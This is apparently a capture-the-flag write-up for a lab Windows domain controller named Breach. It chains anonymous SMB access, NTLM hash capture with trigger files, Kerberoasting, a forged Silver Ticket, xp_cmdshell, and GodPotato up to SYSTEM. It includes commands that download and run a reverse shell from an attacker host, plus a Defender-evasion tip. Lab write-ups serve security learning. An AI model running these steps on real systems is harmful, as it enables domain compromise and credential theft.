# Breach — Writeup
---

## 1. Enumeration

### Nmap

```bash
sudo nmap -sV 10.129.83.110
```

Standard Domain Controller fingerprint: AD DNS, Kerberos, LDAP, SMB, WinRM present.

### SMB null session

```bash
nxc smb 10.129.83.110 -u '' -p ''
```

```
[+] breach.vl\: (Null Auth: True)
```

Anonymous access is allowed. Listing shares:

```bash
smbclient -N -L //10.129.83.110
```

```
ADMIN$    Disk    Remote Admin
C$        Disk    Default share
IPC$      IPC     Remote IPC
NETLOGON  Disk    Logon server share
share     Disk
SYSVOL    Disk    Logon server share
Users     Disk
```

Two non-standard shares: `share` and `Users`.

### Exploring the `share` share

```bash
smbclient -N //10.129.83.110/share
```

```
finance/
software/
transfer/
  claire.pope/   (ACCESS DENIED)
  diana.pope/    (ACCESS DENIED)
  julia.wong/    (ACCESS DENIED)
```

The `transfer` folder contains per-user subdirectories — a classic drop-box pattern. All subdirectories deny listing. `finance` and `software` are empty. The root of `transfer` **accepts writes**.

### Users enumeration via RID cycling

```bash
impacket-lookupsid anonymous@breach.vl -no-pass
```

```
1104: BREACH\staff (SidTypeGroup)
1105: BREACH\Claire.Pope (SidTypeUser)
1106: BREACH\Julia.Wong (SidTypeUser)
1107: BREACH\Hilary.Reed (SidTypeUser)
1108: BREACH\Diana.Pope (SidTypeUser)
1109: BREACH\Jasmine.Price (SidTypeUser)
1110: BREACH\George.Williams (SidTypeUser)
1111: BREACH\Lawrence.Kaur (SidTypeUser)
1112: BREACH\Jasmine.Slater (SidTypeUser)
1113: BREACH\Hugh.Watts (SidTypeUser)
1114: BREACH\Christine.Bruce (SidTypeUser)
1115: BREACH\svc_mssql (SidTypeUser)
```

`svc_mssql` is a notable service account — likely Kerberoastable. AS-REP Roasting against all users returns nothing (no accounts with `DONT_REQUIRE_PREAUTH`).

---

## 2. NTLMv2 hash capture via malicious file upload

The root of `transfer` is writable anonymously. Any file that references a UNC path will trigger an automatic NTLM authentication attempt when a Windows user browses the folder in Explorer. We use `ntlm_theft` to generate a set of trigger files:

```bash
python3 ntlm_theft.py -g all -s <ATTACKER_IP> -f TriggerFiles
```

Start Responder:

```bash
sudo responder -I tun0 -v
```

Upload all trigger files to `\transfer\`:

```bash
smbclient -N //10.129.83.110/share -c 'cd transfer; lcd /path/to/TriggerFiles; prompt OFF; mput *'
```

Shortly after, Responder captures an NTLMv2 hash:

```
[SMB] NTLMv2 Username : BREACH\Julia.Wong
[SMB] NTLMv2 Hash     : Julia.Wong::BREACH:a1a539a3d25a8639:2332F0E0...
```

Save and crack:

```bash
hashcat -m 5600 julia.hash /usr/share/wordlists/rockyou.txt
```

Result: **`Julia.Wong : Computer1`**

---

## 3. User flag

With valid credentials, access `julia.wong`'s transfer folder:

```bash
smbclient //10.129.83.110/share -U Julia.Wong
```

```
cd transfer\julia.wong
get user.txt
```

Alternatively, with a shell (later in the chain):

```
type C:\share\transfer\julia.wong\user.txt
```

---

## 4. Kerberoasting svc_mssql

With domain credentials, enumerate SPNs:

```bash
impacket-GetUserSPNs breach.vl/Julia.Wong:'Computer1' -dc-ip 10.129.83.110 -request
```

```
ServicePrincipalName              Name
--------------------------------  ---------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql
```

Crack the TGS hash:

```bash
hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt
```

Result: **`svc_mssql : Trustno1`**

Direct MSSQL login with these credentials gives only `guest` access — `xp_cmdshell` and `sp_configure` are both denied.

---

## 5. Silver Ticket attack

Since we have the password of `svc_mssql` (the account running MSSQL), we can forge a **Silver Ticket**: a fake TGS that tells the MSSQL service we are `Administrator`, signed with `svc_mssql`'s own NTLM hash. The service trusts it without contacting the DC, because it validates only the signing key (its own account hash).

Compute the NTLM hash of `svc_mssql`:

```bash
python3 -c "import hashlib; print(hashlib.new('md4', 'Trustno1'.encode('utf-16le')).hexdigest())"
```

```
69596c7aa1e8daee17f8e78870e25a5c
```

Forge the Silver Ticket:

```bash
impacket-ticketer \
  -nthash 69596c7aa1e8daee17f8e78870e25a5c \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -domain breach.vl \
  -spn MSSQLSvc/breachdc.breach.vl:1433 \
  Administrator
```

```
[*] Saving ticket in Administrator.ccache
```

Add `breachdc.breach.vl` to `/etc/hosts`:

```bash
echo "10.129.83.110 breachdc.breach.vl breach.vl BREACHDC" | sudo tee -a /etc/hosts
```

Connect to MSSQL using the forged ticket:

```bash
export KRB5CCNAME=/home/kali/Administrator.ccache
impacket-mssqlclient -k breachdc.breach.vl -no-pass
```

```
SQL (BREACH\Administrator  dbo@master)>
```

Now connected as `Administrator` (DBO) inside SQL Server.

---

## 6. RCE via xp_cmdshell

Enable `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```
breach\svc_mssql
```

We have RCE as `svc_mssql`. Prepare a PowerShell reverse shell (`shell.ps1`) and serve it via HTTP:

```bash
python3 -m http.server 8000
nc -lvnp 9001
```

Trigger the reverse shell:

```sql
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>:8000/shell.ps1\")"';
```

Shell received as `breach\svc_mssql`.

---

## 7. Privilege escalation to SYSTEM (SeImpersonatePrivilege + GodPotato)

Checking privileges:

```powershell
whoami /priv
```

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

`SeImpersonatePrivilege` is enabled. Download GodPotato via `certutil` (bypasses Defender's download monitoring compared to `iwr`/`Invoke-WebRequest`):

```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe';
```

Also copy `shell.ps1` to disk (avoids in-memory download issues from the SYSTEM context):

```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>:8000/shell.ps1 C:\Windows\Temp\shell.ps1';
```

Verify GodPotato works:

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"';
```

```
nt authority\system
```

Launch reverse shell as SYSTEM (new listener, e.g. port 9002):

```sql
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1"';
```

Shell received as `nt authority\system`.

---

## 8. Root flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag obtained.**

---

## Attack chain summary

```
Anonymous SMB null session
        │
        ▼
share\transfer writable anonymously
        │
        ▼
ntlm_theft trigger files → Responder captures Julia.Wong NTLMv2 hash
        │
        ▼
Crack hash → Julia.Wong:Computer1 → USER FLAG (transfer\julia.wong\user.txt)
        │
        ▼
Kerberoast svc_mssql (SPN: MSSQLSvc/breachdc.breach.vl:1433)
        │
        ▼
Crack TGS → svc_mssql:Trustno1
        │
        ├── Direct MSSQL login → guest only, xp_cmdshell denied (dead end)
        │
        ▼
Silver Ticket (forge TGS as Administrator using svc_mssql NTLM hash)
        │
        ▼
MSSQL as DBO → enable xp_cmdshell → RCE as svc_mssql
        │
        ▼
SeImpersonatePrivilege → GodPotato → SYSTEM
        │
        ▼
ROOT FLAG
```
